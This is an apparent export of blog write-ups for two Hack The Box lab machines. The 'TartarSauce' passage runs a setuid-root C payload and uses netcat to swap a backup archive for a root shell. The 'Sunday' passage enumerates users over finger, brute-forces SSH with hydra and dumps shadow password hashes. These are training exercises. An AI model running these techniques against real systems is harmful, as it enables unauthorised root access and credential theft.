wait after booting before we run first time OnBootSec=5min # Time between running each consecutive time OnUnitActiveSec=5min Unit=backuperer.service [Install] WantedBy=multi-user.target ---------------------------- cat /lib/systemd/system/backuperer.service [Unit] Description=Backuperer [Service] ExecStart=/usr/sbin/backuperer   Checking what’s in the binary /usr/sbin/backuperer\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62  cat /usr/sbin/backuperer ---------------------------------------- #!/bin/bash #------------------------------------------------------------------------------------- # backuperer ver 1.0.2 - by ȜӎŗgͷͼȜ # ONUMA Dev auto backup program # This tool will keep our webapp backed up incase another skiddie defaces us again. # We will be able to quickly restore from a backup in seconds ;P #------------------------------------------------------------------------------------- # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d\u0026#39; \u0026#39; -f1) check=$tmpdir/check # formatting printbdr() { for n in $(seq 72); do /usr/bin/printf $\u0026#34;-\u0026#34;; done } bdr=$(printbdr) # Added a test file to let us see when the last backup was run /usr/bin/printf $\u0026#34;$bdr\\nAuto backup backuperer backup last ran at : $(/bin/date)\\n$bdr\\n\u0026#34; \u0026gt; $testmsg # Cleanup from last time. /bin/rm -rf $tmpdir/.* $check # Backup onuma website dev files. /usr/bin/sudo -u onuma /bin/tar -zcvf $tmpfile $basedir \u0026amp; # Added delay to wait for backup to complete if large files get added. /bin/sleep 30 # Test the backup integrity integrity_chk() { /usr/bin/diff -r $basedir $check$basedir } /bin/mkdir $check /bin/tar -zxvf $tmpfile -C $check if [[ $(integrity_chk) ]] then # Report errors so the dev can investigate the issue. /usr/bin/printf $\u0026#34;$bdr\\nIntegrity Check Error in backup last ran : $(/bin/date)\\n$bdr\\n$tmpfile\\n\u0026#34; \u0026gt;\u0026gt; $errormsg integrity_chk \u0026gt;\u0026gt; $errormsg exit 2 else # Clean up and save archive to the bkpdir. /bin/mv $tmpfile $bkpdir/onuma-www-dev.bak /bin/rm -rf $check .* exit 0 fi   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  # Set Vars Here basedir=/var/www/html bkpdir=/var/backups tmpdir=/var/tmp testmsg=$bkpdir/onuma_backup_test.txt errormsg=$bkpdir/onuma_backup_error.txt tmpfile=$tmpdir/.$(/usr/bin/head -c100 /dev/urandom |sha1sum|cut -d\u0026#39; \u0026#39; -f1) check=$tmpdir/check 1. Runs every 5 minutes 2. Deletes tmp stuff (created by this script) 3. tar up /var/www/html \u0026gt; $RND ----- This is backgrounded 4. Sleep 30 seconds 5. Extract what we created and integrity check 6. If success exit 2 else delete files exit 0   Testing the diff\nWe want the files in the both directory to success to succeed in this exploit\n1 2 3 4 5  if [[ $(diff -r /var/www/html /srv/) ]]; then then\u0026gt; echo \u0026#34;SUCCESS\u0026#34; then\u0026gt; else echo \u0026#34;FAIL\u0026#34; else\u0026gt; fi SUCCESS   Privilege Excalation 1 2 3 4 5 6  nano privesc.c -------- int main() { setuid(0); # setuid(0) for root system(\u0026#34;/bin/bash -p\u0026#34;); # want bash shell -p (permenent) }   1 2  onuma@TartarSauce:/var/tmp$ uname -a Linux TartarSauce 4.15.0-041500-generic #201802011154 SMP Thu Feb 1 12:05:23 UTC 2018 i686 i686 i686 GNU/Linux   Since it is a 32bit machine we need to compile with -m32\n1  gcc -m32 privesc.c -o privesc   Now we need to add the file in tar\nRef: https://chmodcommand.com/chmod-6005/\n1  chmod 6005 privesc # 6005 Others can read, execute but not write   1 2 3 4 5  mkdir -p var/www/html mv privesc var/www/html chmod 6005 privesc   1  tar -zcvf privesc.tar.gz var/www/html   1 2  nc -lvnp 4321 \u0026lt; privesc.tar.gz listening on [any] 4444 ...   1 2 3  watch -n 1 \u0026#39;systemctl list-timers\u0026#39; watch -n 1 \u0026#39;ls -al\u0026#39;   You have to be quick when the the timer countdown finishes. Run the following command and output the SHA1 generated\n1  onuma@TartarSauce:/var/tmp$ nc 10.10.14.32 4321 \u0026gt; .218926f0f982f568db819d7e2a74384b272e0b00   1  cd check/var/www/html   1  ls -al   To execute the payload we run\n1  ./privesc   Found a directory traversal for Monstra CMS 3.0.4\nRef: https://github.com/monstra-cms/monstra/issues/457\nSkills Learned  Static analysis of shell scripts Identification and exploitation of tar GTFOBin using multiple techniques  ","description":"TartarSauce is a fairly challenging box that highlights the importance of a broad remote enumeration instead of focusing on obvious but potentially less fruitful attack vectors. It features a quite realistic privilege escalation requiring abuses of the tar command. Attention to detail when reviewing tool output is beneficial when attempting this machine.","id":9,"section":"posts","tags":["Hackthebox","OSCP","c","php","apache","web","vulnerability assessment","common applications","outdated software","wordpress","tar","web site structure discovery","remote file inclusion","remote code execution","misconfiguration"],"title":"Hackthebox - Tartarsauce","uri":"https://hswootan.github.io/en/posts/tartarsauce/"},{"content":"\r\rEnumeration 1  nmap -sV -sC -vv 10.10.10.76 -oN sunday_scan.txt   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59  PORT STATE SERVICE REASON VERSION 79/tcp open finger? syn-ack ttl 59 | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind syn-ack ttl 63 2-4 (RPC #100000) 515/tcp open printer syn-ack ttl 59 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.92%I=7%D=4/28%Time=626A25CB%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,\u0026#34;No\\x20one\\x20logged\\x20on\\r\\n\u0026#34;)%r(GetRequest,93,\u0026#34;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n\u0026#34;)%r(Help,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n\u0026#34;)%r(HTTPOptions,93,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(RTSPRequest,93,\u0026#34;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(SS SF:LSessionReq,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(TerminalServerCookie,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;);   Googling port 79. Shows that Finger is an application that allows you to look up information on computer users. The login name, full name, and sometimes other facts about the user you\u0026rsquo;re fingering are frequently displayed. These details could include the user\u0026rsquo;s plan and project files, login time, idle time, time mail was last read, and the user\u0026rsquo;s workplace location and phone number (if known).\nLet’s enumerate port 79 finger  Source:https://book.hacktricks.xyz/pentesting/pentesting-finger Source:https://pentestmonkey.net/tools/user-enumeration/finger-user-enum  1 2 3 4  Installation ------------ # perl -MCPAN -e shell cpan\u0026gt; install Getopt::Std   Usage\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  Usage: finger-user-enum.pl [options] (-u username|-U users.txt) (-t host|-T ips.txt) options are: -m n Maximum number of resolver processes (default: 5) -u user Check if user exists on remote system -U file File of usernames to check via finger service -t host Server host running finger service -T file File of hostnames running the finger service -r host Relay. Intermediate server which allows relaying of finger requests. -p port TCP port on which finger service runs (default: 79) -d Debugging output -s n Wait a maximum of n seconds for reply (default: 5) -v Verbose -h This help message   Banner Grabbing/Basic Connection 1 2  nc -vn 10.10.10.76 79 echo \u0026#34;root\u0026#34; | nc -vn 10.10.10.76 79   User Enumeration 1  finger @10.10.10.76 #List users   1 2 3 4 5 6 7 8 9 10  finger admin@10.10.10.76 #Get info of user Login Name TTY Idle When Where adm Admin \u0026lt; . . . . \u0026gt; dladm Datalink Admin \u0026lt; . . . . \u0026gt; netadm Network Admin \u0026lt; . . . . \u0026gt; netcfg Network Configuratio \u0026lt; . . . . \u0026gt; dhcpserv DHCP Configuration A \u0026lt; . . . . \u0026gt; ikeuser IKE Admin \u0026lt; . . . . \u0026gt; lp Line Printer Admin \u0026lt; . . . . \u0026gt;as   1 2 3 4  finger user@10.10.10.76 #Get info of user Login Name TTY Idle When Where root Super-User console \u0026lt;Dec 19 10:30\u0026gt;   Enumerating finger port 79 with Metasploit 1 2 3  msf6 \u0026gt; search finger use auxiliary/scanner/finger/finger_users   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23  msf6 auxiliary(scanner/finger/finger_users) \u0026gt; run [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: adm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ikeuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: lp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dladm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netadm [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: netcfg [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: dhcpserv [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: bin [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: daemon [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: ftp [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: noaccess [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: nobody4 [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: root [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sshd [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: sys [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: aiuser [+] 10.10.10.76:79 - 10.10.10.76:79 - Found user: openldap [+] 10.10.10.76:79 - 10.10.10.76:79 Users found: adm, aiuser, bin, daemon, dhcpserv, dladm, ftp, ikeuser, lp, netadm, netcfg, noaccess, nobody, nobody4, openldap, root, sshd, sys [*] 10.10.10.76:79 - Scanned 1 of 1 hosts (100% complete) [*] Auxiliary module execution completed   Using the finger enumeration from pentestmonkey will give us more results 1  ./finger-user-enum.pl -U /usr/share/seclists/Usernames/Names/names.txt -t 10.10.10.76   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19  ######## Scan started at Thu Apr 28 12:16:52 2022 ######### admin@10.10.10.76: Login Name TTY Idle When Where..adm Admin \u0026lt; . . . . \u0026gt;..dladm \u0026gt; access@10.10.10.76: access No Access User \u0026lt; . . . . \u0026gt;..nobody4 SunOS 4.x NFS Anonym \u0026lt; . . . . \u0026gt;.. anne marie@10.10.10.76: Login Name TTY Idle When Where..anne ???..marie ???.. bin@10.10.10.76: bin ??? \u0026lt; . . . . \u0026gt;.. dee dee@10.10.10.76: Login Name TTY Idle When Where..dee ???..dee ???.. ike@10.10.10.76: ikeuser IKE Admin \u0026lt; . . . . \u0026gt;.. jo ann@10.10.10.76: Login Name TTY Idle When Where..ann ???..jo ???.. la verne@10.10.10.76: Login Name TTY Idle When Where..la ???..verne ???.. line@10.10.10.76: Login Name TTY Idle When Where..lp Line Printer Admin \u0026lt; . . . . \u0026gt;.. message@10.10.10.76: Login Name TTY Idle When Where..smmsp SendMail Message Sub \u0026lt; . . . . \u0026gt;.. miof mela@10.10.10.76: Login Name TTY Idle When Where..mela ???..miof ???.. root@10.10.10.76: root Super-User console \u0026lt;Dec 19 10:30\u0026gt;.. sammy@10.10.10.76: sammy ??? ssh \u0026lt;Apr 13 13:38\u0026gt; 10.10.14.13 .. sunny@10.10.10.76: sunny ??? ssh \u0026lt;Apr 13 13:52\u0026gt; 10.10.14.13 .. sys@10.10.10.76: sys ??? \u0026lt; . . . . \u0026gt;.. zsa zsa@10.10.10.76: Login Name TTY Idle When Where..zsa ???..zsa ???.. ######## Scan completed at Thu Apr 28 12:21:31 2022 ######### 16 results.   Running nmap again to check all ports\n1  nmap -p- 10.10.10.76 -oN sunday_scan_all_ports.txt --max-retries 0   1 2 3 4 5 6  PORT STATE SERVICE 79/tcp open finger 111/tcp open rpcbind 515/tcp open printer 6787/tcp open smc-admin 22022/tcp open unknown   Let’s enumerate those specific ports\n1  nmap -sV -sC -vv -p 79,111,515,6787,22022 -oN targeted_ports_scan.txt 10.10.10.76   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102  PORT STATE SERVICE REASON VERSION 79/tcp open finger? syn-ack ttl 59 | fingerprint-strings: | GenericLines: | No one logged on | GetRequest: | Login Name TTY Idle When Where | HTTP/1.0 ??? | HTTPOptions: | Login Name TTY Idle When Where | HTTP/1.0 ??? | OPTIONS ??? | Help: | Login Name TTY Idle When Where | HELP ??? | RTSPRequest: | Login Name TTY Idle When Where | OPTIONS ??? | RTSP/1.0 ??? | SSLSessionReq, TerminalServerCookie: |_ Login Name TTY Idle When Where |_finger: No one logged on\\x0D 111/tcp open rpcbind syn-ack ttl 63 2-4 (RPC #100000) 515/tcp open printer syn-ack ttl 59 6787/tcp open ssl/http syn-ack ttl 59 Apache httpd 2.4.33 ((Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14) | http-title: Solaris Dashboard |_Requested resource was https://10.10.10.76:6787/solaris/ | http-methods: |_ Supported Methods: GET HEAD POST OPTIONS | ssl-cert: Subject: commonName=sunday | Subject Alternative Name: DNS:sunday | Issuer: commonName=sunday/organizationName=Host Root CA | Public Key type: rsa | Public Key bits: 2048 | Signature Algorithm: sha256WithRSAEncryption | Not valid before: 2021-12-08T19:40:00 | Not valid after: 2031-12-06T19:40:00 | MD5: 6bd3 4b32 c05a e5fe a8c8 61f0 4361 414a | SHA-1: a5eb c880 968c 84aa 10b2 a944 bad2 56ca aed5 b66a | -----BEGIN CERTIFICATE----- | MIIC4DCCAcqgAwIBAgIHAIqqcz45jjALBgkqhkiG9w0BAQswKDEVMBMGA1UEChMM | SG9zdCBSb290IENBMQ8wDQYDVQQDEwZzdW5kYXkwHhcNMjExMjA4MTk0MDAwWhcN | MzExMjA2MTk0MDAwWjARMQ8wDQYDVQQDEwZzdW5kYXkwggEiMA0GCSqGSIb3DQEB | AQUAA4IBDwAwggEKAoIBAQC67wVPVDRPU/Sahp2QnHx2NlMUQrkyBJrr4TSjS9v6 | /DFKqf3m2XnYuKyFl9BAO8Mi+Hz3ON4nZWmigZGX6LnJpci6whB89pLZdcogruB8 | YMyGuP8y2v3orEBLQ5NrcP6fcKLMp+6PXurvuZDgPH+oXHJyp/w//pkBROQRC0oN | 8dx7Zq2t4ZfDiqhgw1j79V7kZNOjKp8gU1HmQ/BjYEaOfVZNwuTVyqUtfcjuxIio | JEHaVmhNV9Xp9DAOLBFuTXpsJe3anSjGGP0DWMyNOps2VrZUyJwC22U5jlcp7Rj/ | WWE5gnm6ClH44DXlKMIt8O2vq0MfqvvGeSIFbSOPb6Q3AgMBAAGjKjAoMBEGA1Ud | EQQKMAiCBnN1bmRheTATBgNVHSUEDDAKBggrBgEFBQcDATALBgkqhkiG9w0BAQsD | ggEBAC/f3nN6ur2oSSedYNIkf6/+MV3qu8xE+Cqt/SbSk0uSmQ7hYpMhc8Ele/gr | Od0cweaClKXEhugRwfVW5jmjJXrnSZtOpyz09dMhZMA9RJ9efVfnrn5Qw5gUriMx | dFMrAnOIXsFu0vnRZLJP7E95NHpZVECnRXCSPjp4iPe/vyl1OuoVLBhoOwZ8O7zw | WlP/51SiII8LPNyeq+01mCY0mv3RJD9uAeNJawnFwsCo/Tg9/mjk0zxUMaXm80Bb | qsSmST23vYwuPw3c/91fJI4dWb7uEZJa55hRIU0uMPOLOUpN1kKkGPO+7QCzfedc | WPptRhU+2UMGhFXHyGV5EJp2zvc= |_-----END CERTIFICATE----- | tls-alpn: |_ http/1.1 |_http-server-header: Apache/2.4.33 (Unix) OpenSSL/1.0.2o mod_wsgi/4.5.1 Python/2.7.14 |_ssl-date: TLS randomness does not represent time 22022/tcp open ssh syn-ack ttl 63 OpenSSH 7.5 (protocol 2.0) | ssh-hostkey: | 2048 aa:00:94:32:18:60:a4:93:3b:87:a4:b6:f8:02:68:0e (RSA) | ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDsG4q9TS6eAOrX6zI+R0CMMkCTfS36QDqQW5NcF/v9vmNWyL6xSZ8x38AB2T+Kbx672RqYCtKmHcZMFs55Q3hoWQE7YgWOJhXw9agE3aIjXiWCNhmmq4T5+zjbJWbF4OLkHzNzZ2qGHbhQD9Kbw9AmyW8ZS+P8AGC5fO36AVvgyS8+5YbA05N3UDKBbQu/WlpgyLfuNpAq9279mfq/MUWWRNKGKICF/jRB3lr2BMD+BhDjTooM7ySxpq7K9dfOgdmgqFrjdE4bkxBrPsWLF41YQy3hV0L/MJQE2h+s7kONmmZJMl4lAZ8PNUqQe6sdkDhL1Ex2+yQlvbyqQZw3xhuJ | 256 da:2a:6c:fa:6b:b1:ea:16:1d:a6:54:a1:0b:2b:ee:48 (ED25519) |_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAII/0DH8qZiCfAzZNkSaAmT39TyBUFFwjdk8vm7ze+Wwm 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port79-TCP:V=7.92%I=7%D=4/28%Time=626AD276%P=x86_64-pc-linux-gnu%r(Gene SF:ricLines,12,\u0026#34;No\\x20one\\x20logged\\x20on\\r\\n\u0026#34;)%r(GetRequest,93,\u0026#34;Login\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x2 SF:0\\x20When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nGET\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\ SF:?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:?\\?\\?\\r\\n\u0026#34;)%r(Help,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\nHELP\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\?\\?\\?\\r\\n\u0026#34;)%r(HTTPOptions,93,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\ SF:r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nHTTP/1\\.0\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(RTSPRequest,93,\u0026#34;Login\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x2 SF:0When\\x20\\x20\\x20\\x20Where\\r\\n/\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nOPTIONS\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\nRTSP/1\\.0\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(SS SF:LSessionReq,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\x20\\x20Name\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20\\x20\\x20Where\\r\\n\\x16\\x03\\x20 SF:\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x2 SF:0\\x20\\?\\?\\?\\r\\n\u0026#34;)%r(TerminalServerCookie,5D,\u0026#34;Login\\x20\\x20\\x20\\x20\\x20\\ SF:x20\\x20Name\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20 SF:TTY\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20Idle\\x20\\x20\\x20\\x20When\\x20\\x20 SF:\\x20\\x20Where\\r\\n\\x03\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x SF:20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\x20\\?\\?\\?\\r\\n\u0026#34;);   I found port 6787 for a dashboard login\ncan login with sunny : sunday password found by bruteforcing ssh port 22022\nExplore SSH port 22022\n1 2 3 4 5 6 7 8 9 10  finger sammy@10.10.10.76 Login Name TTY Idle When Where sammy ??? ssh \u0026lt;Apr 13 13:38\u0026gt; 10.10.14.13 finger sunny@10.10.10.76 Login Name TTY Idle When Where sunny ??? ssh \u0026lt;Apr 13 13:52\u0026gt; 10.10.14.13   Brute Force the two users\n1 2 3  hydra -l sammy -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022 hydra -l sunny -P /usr/share/wordlists/rockyou.txt 10.10.10.76 ssh -s 22022   1 2 3  ssh sunny@10.10.10.76 -p 22022 password: sunday   Exploitation 1 2  sunny@sunday:~$ sudo -l (root) NOPASSWD: /root/troll   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  sunny@sunday:~$ cat .bash_history su - su - cat /etc/resolv.conf su - ps auxwww|grep overwrite su - sudo -l sudo /root/troll ls /backup ls -l /backup cat /backup/shadow.backup sudo /root/troll sudo /root/troll su - sudo -l sudo /root/troll ps auxwww ps auxwww ps auxwww top top top ps auxwww|grep overwrite su -   1 2 3 4 5 6 7 8 9 10 11  sunny@sunday:~$ cat /backup/shadow.backup mysql:NP::::::: openldap:*LK*::::::: webservd:*LK*::::::: postgres:NP::::::: svctag:*LK*:6445:::::: nobody:*LK*:6445:::::: noaccess:*LK*:6445:::::: nobody4:*LK*:6445:::::: sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445:::::: sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::   1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25  sunny@sunday:~$ cat /etc/passwd root❌0:0:Super-User:/root:/usr/bin/bash daemon❌1:1::/:/bin/sh bin❌2:2::/:/bin/sh sys❌3:3::/:/bin/sh adm❌4:4:Admin:/var/adm:/bin/sh dladm❌15:65:Datalink Admin:/: netadm❌16:65:Network Admin:/: netcfg❌17:65:Network Configuration Admin:/: dhcpserv❌18:65:DHCP Configuration Admin:/: ftp❌21:21:FTPD Reserved UID:/: sshd❌22:22:sshd privsep:/var/empty:/bin/false smmsp❌25:25:SendMail Message Submission 